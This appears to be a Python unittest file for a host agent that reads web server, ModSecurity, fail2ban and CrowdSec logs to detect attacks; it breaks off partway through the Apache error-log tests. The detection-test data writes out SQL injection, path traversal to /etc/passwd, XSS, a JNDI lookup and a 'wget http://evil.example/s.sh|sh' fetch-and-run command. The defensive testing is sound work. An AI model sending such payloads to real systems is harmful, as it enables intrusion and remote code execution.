"""The agent's threat sensor: reading web server, WAF, fail2ban and CrowdSec logs.

Everything here runs the real functions over realistic log text. The agent is
root on a host an attacker may be probing, so besides "does it read each format"
the questions that matter are: does a legitimate visitor ever match, does the
same request ever count twice, can a log's contents reach what is sent, and does
a failed submission lose anything.
"""
import importlib.util
import json
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
_AGENT = _ROOT / 'client' / 'remotepower-agent.py'

NOW = 1_790_000_000
A1 = '185.220.101.7'        # the busy attacker
A2 = '45.155.205.10'
A3 = '91.92.241.5'
A4 = '194.26.29.100'
A6 = '2a0b:f4c0:16c:1::77'

_MON = ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec')
_WD = ('Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun')


def load_agent(name='agent_threat'):
    spec = importlib.util.spec_from_file_location(name, _AGENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def ts_nginx(e):                       # 05/Oct/2026:12:00:01 +0000
    t = time.gmtime(e)
    return f'{t.tm_mday:02d}/{_MON[t.tm_mon - 1]}/{t.tm_year}:{t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d} +0000'


def ts_nginx_err(e):                   # 2026/10/05 12:00:01 (the host's local time)
    return time.strftime('%Y/%m/%d %H:%M:%S', time.localtime(e))


def ts_iso_local(e):                   # 2026-10-05 12:00:01,123 (local)
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(e)) + ',123'


def ts_apache_err(e):                  # [Mon Oct 05 12:00:01.123456 2026]
    t = time.localtime(e)
    return f'[{_WD[t.tm_wday]} {_MON[t.tm_mon - 1]} {t.tm_mday:02d} {t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d}.123456 {t.tm_year}]'


def ts_ctime(e):                       # Mon Oct  5 12:00:01 2026
    t = time.localtime(e)
    return f'{_WD[t.tm_wday]} {_MON[t.tm_mon - 1]} {t.tm_mday:2d} {t.tm_hour:02d}:{t.tm_min:02d}:{t.tm_sec:02d} {t.tm_year}'


def combined(ip, e, req, status=404, ua='Mozilla/5.0', ref='-', size=153):
    return f'{ip} - - [{ts_nginx(e)}] "{req}" {status} {size} "{ref}" "{ua}"'


def run_access(agent, lines, parse=None, fkey='/var/log/nginx/access.log', now=NOW):
    if parse is None:
        parse = agent._ts_access_parser(None)[1]
    agg = agent._TsAgg(now)
    n, parsed = agent._ts_scan_access(lines, parse, agg, fkey, now)
    ev, dropped = agg.events()
    return agg, {e['ip']: e for e in ev}, n, parsed, dropped


class _Agent(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.agent = load_agent()


# ── formats ────────────────────────────────────────────────────────────────────

class TestFormats(_Agent):
    def test_the_standard_combined_layout(self):
        line = combined(A1, NOW - 5, 'GET /.env HTTP/1.1', 404, 'zgrab/0.x')
        name, parse = self.agent._ts_access_parser(None)
        rec = parse(line)
        self.assertEqual((rec['ip'], rec['method'], rec['uri'], rec['status'], rec['ua']),
                         (A1, 'GET', '/.env', 404, 'zgrab/0.x'))
        self.assertEqual(rec['ts'], NOW - 5)

    def test_a_custom_nginx_format_is_read_from_the_servers_own_definition(self):
        fmt = ('$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent '
               '"$http_referer" "$http_user_agent" "$http_x_forwarded_for" rt=$request_time '
               'urt="$upstream_response_time" cc=$http_cf_ipcountry')
        spec = {'kind': 'nginx', 'format': fmt, 'json': False}
        name, parse = self.agent._ts_access_parser(spec)
        self.assertEqual(name, 'custom')
        line = (f'{A1} - bob [{ts_nginx(NOW - 3)}] "POST /wp-login.php HTTP/1.1" 200 4096 "https://x.example/" '
                f'"Mozilla/5.0" "-" rt=0.012 urt="0.011, 0.002" cc=DE')
        rec = parse(line)
        self.assertEqual((rec['ip'], rec['method'], rec['uri'], rec['status']), (A1, 'POST', '/wp-login.php', 200))
        self.assertEqual(rec['ua'], 'Mozilla/5.0')

    def test_a_format_that_puts_the_real_address_in_a_header_variable_first(self):
        fmt = '$http_cf_connecting_ip $remote_addr [$time_local] "$request" $status "$http_user_agent"'
        name, parse = self.agent._ts_access_parser({'kind': 'nginx', 'format': fmt, 'json': False})
        rec = parse(f'{A2} {A1} [{ts_nginx(NOW)}] "GET / HTTP/1.1" 200 "curl/8"')
        self.assertEqual(rec['ip'], A1, '$remote_addr is the one the server resolved')

    def test_a_vhost_prefixed_nginx_format(self):
        fmt = '$host $remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent'
        name, parse = self.agent._ts_access_parser({'kind': 'nginx', 'format': fmt, 'json': False})
        rec = parse(f'example.com {A1} - - [{ts_nginx(NOW)}] "GET /x HTTP/1.1" 404 12')
        self.assertEqual((rec['ip'], rec['uri'], rec['status']), (A1, '/x', 404))

    def test_a_format_that_cannot_name_who_asked_for_what_is_refused(self):
        self.assertIsNone(self.agent._ts_ngx_regex('$time_local "$request" $status'))        # no address
        self.assertIsNone(self.agent._ts_ngx_regex('$remote_addr [$time_local] $status'))    # no request
        self.assertIsNone(self.agent._ts_ngx_regex('$remote_addr "$request"'))               # no status
        self.assertIsNone(self.agent._ts_apc_regex('%h %l %u %t %b'))

    def test_json_lines(self):
        spec = {'kind': 'nginx', 'format': '{"remote_addr":"$remote_addr"}', 'json': True}
        name, parse = self.agent._ts_access_parser(spec)
        self.assertEqual(name, 'json')
        line = json.dumps({'remote_addr': A1, 'time_iso8601': '2026-10-05T12:00:01+00:00',
                           'request': 'GET /.git/config HTTP/1.1', 'status': 404,
                           'http_user_agent': 'nuclei'})
        rec = parse(line)
        self.assertEqual((rec['ip'], rec['uri'], rec['status'], rec['ua']), (A1, '/.git/config', 404, 'nuclei'))
        self.assertGreater(rec['ts'], 0)
        for bad in ('not json', '{"a":', '[1,2]', '{"remote_addr":"1.2.3.4"}'):
            self.assertIsNone(parse(bad), bad)

    def test_apache_combined_vhost_combined_and_common(self):
        a = self.agent
        _, p = a._ts_access_parser({'kind': 'apache', 'format': a._TS_APC_FORMATS['combined'], 'json': False})
        r = p(combined(A1, NOW, 'GET /phpmyadmin/ HTTP/1.1', 404))
        self.assertEqual((r['ip'], r['uri'], r['status']), (A1, '/phpmyadmin/', 404))
        vh = '%v:%p %h %l %u %t "%r" %>s %O "%{Referer}i" "%{User-Agent}i"'
        _, p = a._ts_access_parser({'kind': 'apache', 'format': vh, 'json': False})
        r = p(f'example.com:443 {A1} - - [{ts_nginx(NOW)}] "GET /x HTTP/1.1" 404 99 "-" "sqlmap/1.7"')
        self.assertEqual((r['ip'], r['status'], r['ua']), (A1, 404, 'sqlmap/1.7'))
        _, p = a._ts_access_parser({'kind': 'apache', 'format': a._TS_APC_FORMATS['common'], 'json': False})
        r = p(f'{A1} - - [{ts_nginx(NOW)}] "GET /x HTTP/1.1" 404 99')
        self.assertEqual((r['ip'], r['status']), (A1, 404))

    def test_apache_escaped_quotes_in_the_user_agent(self):
        _, p = self.agent._ts_access_parser(
            {'kind': 'apache', 'format': self.agent._TS_APC_COMBINED, 'json': False})
        r = p(f'{A1} - - [{ts_nginx(NOW)}] "GET /x HTTP/1.1" 404 9 "-" "Mozilla \\"quoted\\" agent"')
        self.assertEqual(r['status'], 404)
        self.assertIn('quoted', r['ua'])

    def test_a_layout_nothing_matched_falls_back_to_the_tolerant_reader(self):
        weird = f'[{ts_nginx(NOW)}] vhost01 {A1} "GET /.env HTTP/1.1" 404 gzip=1 "Mozilla/5.0"'
        self.assertIsNone(self.agent._ts_access_parser(None)[1](weird))
        rec = self.agent._ts_generic_access(weird)
        self.assertEqual((rec['ip'], rec['uri'], rec['status']), (A1, '/.env', 404))
        self.assertIsNone(self.agent._ts_generic_access('nothing useful here'))
        self.assertIsNone(self.agent._ts_generic_access('"GET / HTTP/1.1" 200'))   # no address

    def test_ipv6_clients(self):
        rec = self.agent._ts_access_parser(None)[1](combined(A6, NOW, 'GET /.env HTTP/1.1', 404))
        self.assertEqual(rec['ip'], A6)

    def test_a_garbage_request_line_still_parses_and_has_no_method(self):
        rec = self.agent._ts_access_parser(None)[1](
            f'{A1} - - [{ts_nginx(NOW)}] "\\x16\\x03\\x01\\x02" 400 150 "-" "-"')
        self.assertEqual((rec['method'], rec['uri'], rec['status']), ('', '', 400))


class TestTimes(_Agent):
    def test_time_local_with_offsets_and_without_locale(self):
        a = self.agent
        self.assertEqual(a._ts_time_local('05/Oct/2026:12:00:00 +0000'),
                         a._ts_time_local('05/Oct/2026:14:00:00 +0200'))
        self.assertEqual(a._ts_time_local('05/Oct/2026:12:00:00 -0500') - a._ts_time_local('05/Oct/2026:12:00:00 +0000'), 5 * 3600)
        self.assertEqual(a._ts_time_local('[05/Oct/2026:12:00:00 +0000]'), a._ts_time_local('05/Oct/2026:12:00:00 +0000'))
        for bad in ('', None, 'garbage', '05/Xyz/2026:12:00:00 +0000', '99/Oct/2026:99:00:00 +0000'):
            self.assertEqual(a._ts_time_local(bad), 0, bad)

    def test_iso_utc_local_and_offsets(self):
        a = self.agent
        self.assertEqual(a._ts_time_iso('2026-10-05T12:00:00Z'), a._ts_time_iso('2026-10-05T14:00:00+02:00'))
        self.assertEqual(a._ts_time_iso('2026-10-05T12:00:00.123456789Z'), a._ts_time_iso('2026-10-05T12:00:00Z'))
        self.assertEqual(a._ts_time_iso('2026-10-05 12:00:00', local=True),
                         int(time.mktime((2026, 10, 5, 12, 0, 0, 0, 0, -1))))
        self.assertEqual(a._ts_time_iso('2026-10-05 12:00:00'), a._ts_time_iso('2026-10-05T12:00:00Z'))
        self.assertEqual(a._ts_time_iso('nope'), 0)

    def test_ctime(self):
        self.assertEqual(self.agent._ts_time_ctime(ts_ctime(NOW)), NOW)
        self.assertEqual(self.agent._ts_time_ctime('x'), 0)

    def test_only_public_addresses(self):
        a = self.agent
        for ip in ('10.0.0.5', '192.168.1.1', '127.0.0.1', '169.254.1.1', '::1', 'fd00::1', '224.0.0.1',
                   '203.0.113.9', 'x', '', None, '1.2.3.4.5'):
            self.assertIsNone(a._ts_ip(ip), ip)
        self.assertEqual(a._ts_ip(A1), A1)
        self.assertEqual(a._ts_ip('[2a0b:f4c0:16c:1::77]'), A6)
        self.assertEqual(a._ts_ip('::ffff:185.220.101.7'), A1)


# ── what counts as hostile ─────────────────────────────────────────────────────

class TestClassifier(_Agent):
    def kinds(self, method, uri, status=404, ua=''):
        return self.agent._ts_classify(method, uri, status, ua)

    def test_each_class(self):
        cases = [
            ('GET', "/index.php?id=1' UNION SELECT user,pass FROM users--", 'sqli'),
            ('GET', '/?id=1%27%20UNION%20ALL%20SELECT%201%2C2', 'sqli'),
            ('GET', '/?q=1 or 1=1', 'sqli'),
            ('GET', '/?id=1;sleep(5)', 'sqli'),
            ('GET', '/a?x=../../../../etc/passwd', 'traversal'),
            ('GET', '/a?x=..%2f..%2f..%2fetc%2fpasswd', 'traversal'),
            ('GET', '/a?x=%252e%252e%252f%252e%252e%252fetc/passwd', 'traversal'),
            ('GET', '/a?f=php://filter/convert.base64-encode/resource=index', 'traversal'),
            ('GET', '/search?q=<script>alert(1)</script>', 'xss'),
            ('GET', '/x?a=%3Cscript%3Ealert(1)%3C/script%3E', 'xss'),
            ('GET', '/x?a=javascript:alert(1)', 'xss'),
            ('GET', '/?x=${jndi:ldap://evil.example/a}', 'rce'),
            ('GET', '/cgi-bin/x?a=;wget http://evil.example/s.sh|sh', 'rce'),
            ('GET', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'rce'),
            ('GET', '/actuator/env', 'rce'),
            ('GET', '/boaform/admin/formLogin', 'rce'),
            ('POST', '/wp-login.php', 'login'),
            ('POST', '/xmlrpc.php', 'login'),
            ('POST', '/administrator/index.php', 'login'),
            ('GET', '/.env', 'probe'),
            ('GET', '/.git/config', 'probe'),
            ('GET', '/wp-config.php.bak', 'probe'),
            ('GET', '/backup.zip', 'probe'),
            ('GET', '/db.sql', 'probe'),
            ('GET', '/wp-admin/setup-config.php', 'probe'),
            ('GET', '/?author=1', 'probe'),
            ('GET', '/id_rsa', 'probe'),
            ('CONNECT', 'example.com:443', 'probe'),
            ('GET', 'http://example.com/', 'probe'),
        ]
        for method, uri, want in cases:
            status = 200 if want == 'login' else 404
            self.assertEqual(self.kinds(method, uri, status)[:1], (want,), (method, uri))

    def test_a_request_is_one_class_the_most_serious(self):
        k = self.kinds('GET', "/.env?x=1' union select 1,2 from users--")
        self.assertEqual(k, ('sqli',))
        self.assertEqual(self.kinds('GET', '/a?x=${jndi:ldap://e/a}&y=<script>')[0], 'rce')

    def test_things_a_real_site_serves_count_only_when_refused(self):
        for uri in ('/phpmyadmin/', '/phpmyadmin/index.php', '/cgi-bin/mailman/listinfo', '/server-status',
                    '/manager/html', '/actuator', '/phpinfo.php', '/info.php', '/test.php', '/solr/'):
            self.assertEqual(self.kinds('GET', uri, 200), (), f'{uri} answered 200 is the operator')
            self.assertEqual(self.kinds('GET', uri, 301), (), uri)
            self.assertEqual(self.kinds('GET', uri, 401), (), f'{uri}: a 401 is an ordinary auth challenge')
            for status in (403, 404):
                self.assertEqual(self.kinds('GET', uri, status), ('probe',), (uri, status))

    def test_legitimate_traffic_never_matches(self):
        """The cost of a false match is a public report about a customer."""
        legit = [
            ('GET', '/', 200), ('GET', '/index.html', 200), ('GET', '/index.php', 200),
            ('GET', '/favicon.ico', 404), ('GET', '/robots.txt', 200), ('GET', '/sitemap.xml', 200),
            ('GET', '/apple-touch-icon.png', 404), ('GET', '/.well-known/acme-challenge/abc123', 200),
            ('GET', '/.well-known/security.txt', 200),
            ('GET', '/assets/app.js?v=7.2.0', 200), ('GET', '/static/css/main.css', 304),
            ('GET', '/search?q=select+a+color+from+the+list', 200),
            ('GET', '/search?q=how+to+union+two+lists', 200),
            ('GET', '/blog/2026/10/how-to-read-the-etc-hosts-file', 200),
            ('GET', '/api/v1/users?page=2&per_page=50', 200), ('GET', '/api/v1/users/me', 200),
            ('GET', '/wp-json/wp/v2/users/me', 200), ('GET', '/wp-json/wp/v2/posts?per_page=10', 200),
            ('GET', '/wp-login.php', 200), ('GET', '/wp-login.php?redirect_to=%2Fwp-admin%2F', 200),
            ('POST', '/wp-login.php', 302), ('POST', '/login', 303), ('POST', '/api/orders', 201),
            ('POST', '/wp-admin/admin-ajax.php', 200), ('GET', '/wp-admin/', 302),
            ('GET', '/download/release-1.2.tar.gz', 200), ('GET', '/files/report.zip', 200),
            ('GET', '/images/photo.jpg', 200), ('GET', '/products/item?id=42&color=red', 200),
            ('GET', '/user/profile?tab=info', 200), ('GET', '/docs/guide#section-2', 200),
            ('HEAD', '/', 200), ('OPTIONS', '/api', 204),
            ('GET', '/_next/static/chunks/main.js', 200), ('GET', '/healthz', 200),
            ('GET', '/metrics', 200), ('GET', '/status', 200),
            ('GET', '/login', 200), ('GET', '/signin', 200),
            ('GET', '/admin/dashboard', 200), ('GET', '/administrator/', 200),
            ('GET', '/composer-guide.html', 200),
        ]
        for method, uri, status in legit:
            self.assertEqual(self.kinds(method, uri, status, 'Mozilla/5.0 (X11; Linux x86_64) Firefox/130.0'),
                             (), (method, uri, status))

    def test_a_failed_login_is_a_post_that_was_not_redirected(self):
        self.assertEqual(self.kinds('POST', '/wp-login.php', 200), ('login',))
        self.assertEqual(self.kinds('POST', '/wp-login.php', 403), ('login',))
        self.assertEqual(self.kinds('POST', '/wp-login.php', 302), ())
        self.assertEqual(self.kinds('GET', '/wp-login.php', 200), ())

    def test_attack_tools_are_named_by_user_agent(self):
        for ua in ('sqlmap/1.7.2#stable (https://sqlmap.org)', 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)',
                   'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)', 'zgrab/0.x',
                   'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
                   'WPScan v3.8.25', 'gobuster/3.6', 'masscan/1.3', 'feroxbuster/2.10.0', 'Acunetix-Product'):
            self.assertEqual(self.kinds('GET', '/', 200, ua), ('scanner',), ua)
        self.assertEqual(self.kinds('GET', '/.env', 404, 'zgrab/0.x'), ('probe', 'scanner'))
        for ua in ('Mozilla/5.0 (X11; Linux x86_64) Chrome/120', 'curl/8.0', 'Go-http-client/1.1',
                   'python-requests/2.31.0', 'Googlebot/2.1', 'Prometheus/2.45', 'Censys Inspect',
                   'Mozilla/5.0 (compatible; Shodan)', ''):
            self.assertEqual(self.kinds('GET', '/', 200, ua), (), ua)

    def test_a_rate_limited_answer_is_flooding(self):
        self.assertEqual(self.kinds('GET', '/api/data', 429), ('flood',))
        self.assertEqual(self.kinds('GET', '/api/data', 200), ())

    def test_a_huge_target_is_cut_before_any_pattern_sees_it(self):
        t0 = time.monotonic()
        for uri in ('/' + 'a' * 100_000, '/?x=' + 'union ' * 20_000, '/' + '%25' * 50_000, '/' + ('..' * 30_000)):
            self.kinds('GET', uri, 404)
        self.assertLess(time.monotonic() - t0, 2.0, 'a long request line stalled the classifier')

    def test_odd_input_does_not_raise(self):
        for args in ((None, None, None), ('', '', ''), ('GET', None, 'x'), (5, 5, 5), ('GET', '\x00\xff', 404)):
            self.agent._ts_classify(*args)


# ── the access log scan ────────────────────────────────────────────────────────

class TestAccessScan(_Agent):
    def lines(self, ip, n, req='GET /.env HTTP/1.1', status=404, start=60, ua='Mozilla/5.0'):
        return [combined(ip, NOW - start + i, req, status, ua) for i in range(n)]

    def test_counts_tokens_and_outcome(self):
        lines = (self.lines(A1, 5, 'GET /.env HTTP/1.1', 404)
                 + self.lines(A1, 3, "GET /?id=1' union select 1,2 from t-- HTTP/1.1", 403)
                 + self.lines(A1, 2, 'GET /.git/config HTTP/1.1', 200))
        agg, ev, n, parsed, dropped = run_access(self.agent, lines)
        e = ev[A1]
        self.assertEqual((n, parsed), (10, 10))
        self.assertEqual(e['src'], {'web': 10})
        self.assertEqual(e['tok']['web'], {'req:probe': 7, 'req:sqli': 3})
        self.assertEqual((e['ans'], e['blk']), (2, 8), 'answered 2xx vs refused')
        self.assertEqual(e['last'] - e['first'] >= 0, True)

    def test_a_plain_address_under_the_minimum_is_left_out_and_counted(self):
        lines = self.lines(A1, 2) + self.lines(A2, 5)
        agg, ev, n, parsed, dropped = run_access(self.agent, lines)
        self.assertEqual(set(ev), {A2})
        self.assertEqual(dropped, 1)

    def test_a_waf_or_f2b_signal_is_never_left_out_for_being_small(self):
        a = self.agent
        agg = a._TsAgg(NOW)
        agg.hit('waf', 'x', A1, NOW, ['crs:942100'], 1, blk=1, tx='t1')
        agg.ban(A2, 'sshd')
        ev, dropped = agg.events()
        self.assertEqual({e['ip'] for e in ev}, {A1, A2})
        self.assertEqual(dropped, 0)

    def test_private_stale_and_unparsable_lines_are_not_evidence(self):
        lines = (self.lines('10.0.0.5', 5) + self.lines('192.168.1.9', 5)
                 + self.lines(A1, 5, start=7 * 3600)                 # older than the lookback
                 + ['garbage line', '', 'GET / HTTP/1.1'] + self.lines(A2, 4))
        agg, ev, n, parsed, dropped = run_access(self.agent, lines)
        self.assertEqual(set(ev), {A2})
        self.assertEqual(parsed, 19, 'garbage is not counted as parsed')

    def test_a_request_with_two_signals_is_one_event(self):
        lines = self.lines(A1, 4, 'GET /.env HTTP/1.1', 404, ua='zgrab/0.x')
        agg, ev, *_ = run_access(self.agent, lines)
        self.assertEqual(ev[A1]['src'], {'web': 4})
        self.assertEqual(ev[A1]['tok']['web'], {'req:probe': 4, 'req:scanner': 4})

    def test_a_custom_log_through_the_format_the_server_declared(self):
        fmt = '$remote_addr [$time_local] "$request" $status "$http_user_agent" rt=$request_time'
        parse = self.agent._ts_access_parser({'kind': 'nginx', 'format': fmt, 'json': False})[1]
        lines = [f'{A1} [{ts_nginx(NOW - 10 + i)}] "GET /.env HTTP/1.1" 404 "curl/8" rt=0.001' for i in range(5)]
        agg, ev, n, parsed, _ = run_access(self.agent, lines, parse=parse)
        self.assertEqual((n, parsed, ev[A1]['src']), (5, 5, {'web': 5}))

    def test_a_flood_of_distinct_addresses_is_capped_and_the_rest_counted(self):
        a = self.agent
        agg = a._TsAgg(NOW)
        for i in range(a.THREAT_MAX_EVENTS + 40):
            agg.hit('web', 'x', f'45.{i // 250 + 1}.{i % 250 + 1}.9', NOW, ['req:probe'], n=a.THREAT_MIN_HITS + (i % 7))
        ev, dropped = agg.events()
        self.assertEqual(len(ev), a.THREAT_MAX_EVENTS)
        self.assertEqual(dropped, 40)
        sizes = [sum(e['src'].values()) for e in ev]
        self.assertEqual(sizes, sorted(sizes, reverse=True), 'the biggest are the ones kept')


class TestAggregator(_Agent):
    def test_the_same_request_in_two_logs_is_not_added_twice(self):
        a = self.agent
        agg = a._TsAgg(NOW)
        for fkey in ('/var/log/nginx/access.log', '/var/log/nginx/site.log'):
            for _ in range(10):
                agg.hit('web', fkey, A1, NOW, ['req:probe'])
        ev, _ = agg.events()
        self.assertEqual(ev[0]['src'], {'web': 10})
        self.assertEqual(ev[0]['tok']['web']['req:probe'], 10)

    def test_one_transaction_with_five_rule_matches_is_one_event(self):
        agg = self.agent._TsAgg(NOW)
        for tok in ('crs:942100', 'crs:942190', 'crstag:attack-sqli', 'crs:949110', 'req:sqli'):
            agg.hit('waf', 'a', A1, NOW, [tok], 1, blk=1, tx='tx1')
        agg.hit('waf', 'a', A1, NOW, ['crs:942100'], 1, blk=1, tx='tx1')      # the same rule again
        agg.hit('waf', 'a', A1, NOW, ['crs:942100'], 1, blk=1, tx='tx2')      # a second request
        ev, _ = agg.events()
        e = ev[0]
        self.assertEqual(e['src'], {'waf': 2})
        self.assertEqual(e['blk'], 2)
        self.assertEqual(e['tok']['waf']['crs:942100'], 2)
        self.assertEqual(e['tok']['waf']['crs:949110'], 1)

    def test_waf_events_seen_in_two_files_take_the_larger(self):
        agg = self.agent._TsAgg(NOW)
        for i in range(5):
            agg.hit('waf', 'audit', A1, NOW, ['crs:942100'], 1, tx=f'a{i}')
        for i in range(3):
            agg.hit('waf', 'errlog', A1, NOW, ['crs:942100'], 1, tx=f'a{i}')
        ev, _ = agg.events()
        self.assertEqual(ev[0]['src'], {'waf': 5})

    def test_bans_decisions_and_cves(self):
        agg = self.agent._TsAgg(NOW)
        agg.hit('f2b', 'f', A1, NOW, ['jail:sshd'], 3)
        for j in ('sshd', 'sshd', 'recidive'):
            agg.ban(A1, j)
        agg.hit('cs', 'cscli', A1, NOW, ['cs:crowdsecurity/ssh-bf'], 6)
        agg.decision(A1)
        agg.add_cves(A1, ['CVE-2021-44228', 'CVE-2021-44228'])
        ev, _ = agg.events()
        e = ev[0]
        self.assertEqual((e['ban'], e['dec'], e['cve']), (['sshd', 'recidive'], 1, ['CVE-2021-44228']))
        self.assertEqual(e['src'], {'f2b': 3, 'cs': 6})

    def test_first_and_last_span_the_events(self):
        agg = self.agent._TsAgg(NOW)
        agg.hit('web', 'x', A1, NOW - 500, ['req:probe'], 3)
        agg.hit('web', 'y', A1, NOW - 10, ['req:probe'], 3)
        e = agg.events()[0][0]
        self.assertEqual((e['first'], e['last']), (NOW - 500, NOW - 10))


# ── error logs ─────────────────────────────────────────────────────────────────

def ngx_modsec(e, ip, uid, rid, tag, msg, denied=False, uri='/index.php'):
    head = ('Access denied with code 403 (phase 2). Matched "Operator `Ge\' with parameter `5\' against '
            'variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE\' (Value: `5\' ) ' if denied else
            "Warning. detected SQLi using libinjection with fingerprint 's&1c' ")
    return (f'{ts_nginx_err(e)} [warn] 1234#1234: *5678 ModSecurity: {head}'
            f'[file "/etc/nginx/modsec/coreruleset/rules/REQUEST-942.conf"] [line "66"] [id "{rid}"] [rev ""] '
            f'[msg "{msg}"] [data ""] [severity "2"] [ver "OWASP_CRS/4.29.0"] [maturity "0"] [accuracy "0"] '
            f'[tag "modsecurity"] [tag "{tag}"] [tag "paranoia-level/1"] [hostname "example.com"] '
            f'[uri "{uri}"] [unique_id "{uid}"] [ref ""], client: {ip}, server: example.com, '
            f'request: "GET {uri}?id=1%27%20UNION%20SELECT%201%2C2-- HTTP/1.1", host: "example.com"')


class _MinHitsOne(_Agent):
    """These tests are about what each line means; the three-hit minimum has its
    own test (TestAccessScan), so it is switched off here and restored after."""

    def setUp(self):
        self._min = self.agent.THREAT_MIN_HITS
        self.agent.THREAT_MIN_HITS = 1
        self.addCleanup(setattr, self.agent, 'THREAT_MIN_HITS', self._min)


class TestNginxError(_MinHitsOne):
    def scan(self, lines):
        agg = self.agent._TsAgg(NOW)
        n, parsed = self.agent._ts_scan_nginx_error(lines, agg, '/var/log/nginx/error.log', NOW)
        ev, _ = agg.events()
        return {e['ip']: e for e in ev}, n, parsed

    def test_modsecurity_connector_lines_are_one_transaction_each(self):
        lines = [
            ngx_modsec(NOW - 9, A1, '1790000001.1', 942100, 'attack-sqli', 'SQL Injection Attack Detected via libinjection'),
            ngx_modsec(NOW - 9, A1, '1790000001.1', 942190, 'attack-sqli', 'MSSQL code execution'),
            ngx_modsec(NOW - 9, A1, '1790000001.1', 949110, 'anomaly-evaluation',
                       'Inbound Anomaly Score Exceeded (Total Score: 10)', denied=True),
            ngx_modsec(NOW - 5, A1, '1790000005.2', 942100, 'attack-sqli', 'SQL Injection Attack Detected via libinjection', denied=True),
        ]
        ev, n, parsed = self.scan(lines)
        e = ev[A1]
        self.assertEqual((n, parsed), (4, 4))
        self.assertEqual(e['src'], {'waf': 2}, 'two requests, four rule matches')
        self.assertEqual(e['blk'], 2)
        self.assertEqual(e['tok']['waf']['crs:942100'], 2)
        self.assertIn('crstag:attack-sqli', e['tok']['waf'])
        self.assertIn('req:sqli', e['tok']['waf'], 'the request line is classified too')

    def test_rate_limit_auth_failures_forbidden_and_missing_files(self):
        L = ts_nginx_err
        lines = [
            f'{L(NOW - 50)} [error] 1234#1234: *11 limiting requests, excess: 20.500 by zone "wp_login", client: {A2}, server: example.com, request: "POST /wp-login.php HTTP/1.1", host: "example.com"',
            f'{L(NOW - 49)} [error] 1234#1234: *11 limiting connections by zone "pub_conn", client: {A2}, server: example.com',
            f'{L(NOW - 40)} [error] 1234#1234: *9 user "admin" was not found in "/etc/nginx/.htpasswd", client: {A3}, server: example.com, request: "GET /admin/ HTTP/1.1", host: "example.com"',
            f'{L(NOW - 39)} [error] 1234#1234: *10 user "admin": password mismatch, client: {A3}, server: example.com, request: "GET /admin/ HTTP/1.1", host: "example.com"',
            f'{L(NOW - 30)} [error] 1234#1234: *12 access forbidden by rule, client: {A2}, server: example.com, request: "GET /wp-config.php.bak HTTP/1.1", host: "example.com"',
            f'{L(NOW - 20)} [error] 1234#1234: *13 open() "/var/www/html/.env" failed (2: No such file or directory), client: {A4}, server: example.com, request: "GET /.env HTTP/1.1", host: "example.com"',
            f'{L(NOW - 19)} [error] 1234#1234: *14 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: {A4}, server: example.com, request: "GET /shell.php.bak HTTP/1.1", upstream: "fastcgi://unix:/run/php.sock:", host: "example.com"',
        ]
        ev, n, parsed = self.scan(lines)
        self.assertEqual(ev[A2]['tok']['err'].get('req:flood'), 2)
        self.assertEqual(ev[A3]['tok']['err'], {'req:login': 2})
        self.assertIn('req:probe', ev[A2]['tok']['err'])
        self.assertEqual(ev[A4]['tok']['err'], {'req:probe': 2})
        self.assertEqual(parsed, 7)

    def test_noise_without_a_client_or_that_is_not_an_attack_is_ignored(self):
        L = ts_nginx_err
        lines = [
            f'{L(NOW - 9)} [notice] 1#1: signal process started',
            f'{L(NOW - 9)} [crit] 1234#1234: *14 SSL_do_handshake() failed (SSL: error:0A000126) while SSL handshaking, client: {A1}, server: 0.0.0.0:443',
            f'{L(NOW - 9)} [error] 1234#1234: *15 upstream timed out (110: Connection timed out), client: {A1}, server: example.com, request: "GET /slow HTTP/1.1"',
            f'{L(NOW - 9)} [error] 1234#1234: *16 open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: {A1}, server: example.com, request: "GET /favicon.ico HTTP/1.1"',
            f'{L(NOW - 9)} [error] 1234#1234: *17 limiting requests, excess: 1.0 by zone "z", client: 10.0.0.5, server: example.com',
            'not an error log line at all',
        ]
        ev, n, parsed = self.scan(lines)
        self.assertEqual(ev, {})
        self.assertEqual((n, parsed), (6, 5))

    def test_old_lines_are_not_evidence(self):
        ev, *_ = self.scan([f'{ts_nginx_err(NOW - 8 * 3600)} [error] 1234#1234: *9 user "a" was not found in "/x", client: {A3}, server: s'])
        self.assertEqual(ev, {})


class TestApacheError(_MinHitsOne):
    def scan(self, lines):
        agg = self.agent._TsAgg(NOW)
        n, parsed = self.agent._ts_scan_apache_error(lines, agg, '/var/log/apache2/error.log', NOW)
        ev, _ = agg.events()
        return {e['ip']: e for e in ev}, n, parsed

    def test_modsecurity_auth_denied_and_missing_files(self):
        T = ts_apache_err
        lines = [
            f'{T(NOW - 30)} [security2:error] [pid 1234] [client {A1}:54321] ModSecurity: Access denied with code 403 (phase 2). Matched "Operator `Ge\' with parameter `5\'" [file "/x.conf"] [line "114"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [tag "attack-sqli"] [hostname "example.com"] [uri "/index.php"] [unique_id "ZeXyZ12345"]',
            f'{T(NOW - 29)} [security2:error] [pid 1234] [client {A1}:54321] ModSecurity: Warning. Matched "x" [id "942100"] [msg "SQLi"] [tag "attack-sqli"] [unique_id "ZeXyZ12345"]',
            f'{T(NOW - 20)} [auth_basic:error] [pid 1234] [client {A3}:5555] AH01617: user admin: authentication failure for "/admin": Password Mismatch',
            f'{T(NOW - 19)} [auth_basic:error] [pid 1234] [client {A3}:5556] AH01618: user x not found: /admin',
